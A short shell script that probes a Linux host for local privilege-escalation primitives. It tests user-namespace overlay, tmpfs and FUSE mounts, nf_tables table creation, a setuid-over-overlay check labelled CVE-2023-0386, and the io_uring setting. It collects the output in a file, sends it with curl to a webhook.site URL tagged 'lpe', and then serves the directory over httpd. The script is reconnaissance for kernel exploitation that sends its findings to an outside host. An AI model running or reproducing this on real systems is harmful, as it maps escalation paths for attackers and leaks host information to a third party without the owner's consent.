#!/bin/sh
{
echo "==userns-overlay-mount=="
unshare -Urm sh -c '
mkdir -p /tmp/l /tmp/u /tmp/w /tmp/m
echo "in userns: $(id)"
mount -t tmpfs none /tmp/m 2>&1 && echo "tmpfs mount OK" || echo "tmpfs mount FAIL"
echo "x" > /tmp/l/f
mount -t overlay overlay -o lowerdir=/tmp/l,upperdir=/tmp/u,workdir=/tmp/w /tmp/ovl 2>&1 && echo "OVERLAY-USERNS OK" || echo "overlay mount FAIL"
' 2>&1
echo "==fuse=="
ls -la /dev/fuse 2>&1
unshare -Urm sh -c 'mkdir -p /tmp/fm; mount -t fuse none /tmp/fm 2>&1 && echo "FUSE MOUNT OK" || echo "fuse mount FAIL"' 2>&1
echo "==nf_tables-userns=="
unshare -Urn sh -c 'nft list ruleset 2>&1 | head -3; nft add table inet t 2>&1 && echo "NFT-CREATE OK" || echo "nft FAIL"' 2>&1
echo "==cve-2023-0386-check=="
unshare -Urm sh -c 'mkdir -p /tmp/a /tmp/b /tmp/c; echo "setuid test"; dd if=/dev/zero of=/tmp/b/file bs=1 count=0 2>/dev/null; chmod 4755 /tmp/b/file 2>&1; mount -t overlay overlay -o lowerdir=/tmp/a,upperdir=/tmp/b,workdir=/tmp/c /tmp/o 2>&1 && echo OVLOK || echo OVLFAIL' 2>&1
echo "==io_uring=="
cat /proc/sys/kernel/io_uring_disabled 2>&1
echo "==unshare-version=="
unshare --version 2>&1; nft --version 2>&1
} > /www/out.txt 2>&1
curl -sk -m 20 --data-binary @/www/out.txt "https://webhook.site/$TOK2/lpe"
httpd -f -p 80 -h /www
